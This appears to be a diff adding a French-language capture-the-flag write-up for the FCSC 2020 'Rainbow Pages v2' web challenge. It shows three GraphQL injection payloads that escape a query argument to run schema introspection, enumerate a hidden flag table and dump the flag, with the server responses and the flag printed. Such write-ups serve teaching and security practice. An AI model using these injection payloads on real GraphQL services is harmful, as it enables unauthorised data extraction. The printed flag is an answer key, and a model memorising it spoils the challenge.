@@ -1,0 +1,36 @@
+Write-ups:
+
+* https://tek7987.github.io/WUs/FCSC-2020/web_rainbow-pages-v2.html
+* https://sentrywhale.com/writeup/anssi-2020-rainbow-rainbow-v2
+
+Resources:
+
+* GraphQL introspection query
+* GraphQL Voyager: https://apis.guru/graphql-voyager/
+
+
+GraphQL injection input in Rainbow2:
+
+    a"}}]}){ nodes{firstname}}, __schema{ types{name}} }#
+
+La réponse du serveur :
+
+    {"data":{"allCooks":{"nodes":[{"firstname":"Trycia"},{"firstname":"Paula"}]},"__schema":{"types":[{"name":"Query"},{"name":"Node"},{"name":"ID"},{"name":"Int"},{"name":"Cursor"},{"name":"CooksOrderBy"},{"name":"CookCondition"},{"name":"String"},{"name":"CookFilter"},{"name":"IntFilter"},{"name":"Boolean"},{"name":"StringFilter"},{"name":"CooksConnection"},{"name":"Cook"},{"name":"CooksEdge"},{"name":"PageInfo"},{"name":"FlagNotTheSameTableNamesOrderBy"},{"name":"FlagNotTheSameTableNameCondition"},{"name":"FlagNotTheSameTableNameFilter"},{"name":"FlagNotTheSameTableNamesConnection"},{"name":"FlagNotTheSameTableName"},{"name":"FlagNotTheSameTableNamesEdge"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]}}}
+
+FlagNotTheSameTableName semble intéressant x).
+On liste maintenant les champs de cette table :
+
+    a"}}]}){ nodes{firstname}}, __type( name:"FlagNotTheSameTableName") { fields{name}} }#
+
+La réponse du serveur :
+
+    {"data":{"allCooks":{"nodes":[{"firstname":"Trycia"},{"firstname":"Paula"}]},"__type":{"fields":[{"name":"nodeId"},{"name":"id"},{"name":"flagNotTheSameFieldName"}]}}}
+
+Comme pour la table Cook, il faut rajouter all au début et un s à la fin de FlagNotTheSameTableName comme ceci : allFlagNotTheSameTableNames
+Et notre requête finale donne :
+
+    a"}}]}){nodes{firstname}}, allFlagNotTheSameTableNames{ nodes{flagNotTheSameFieldName}} }#
+
+La réponse du serveur :
+
+    {"data":{"allCooks":{"nodes":[{"firstname":"Trycia"},{"firstname":"Paula"}]},"allFlagNotTheSameTableNames":{"nodes":[{"flagNotTheSameFieldName":"FCSC{70c48061ea21935f748b11188518b3322fcd8285b47059fa99df37f27430b071}"}]}}}
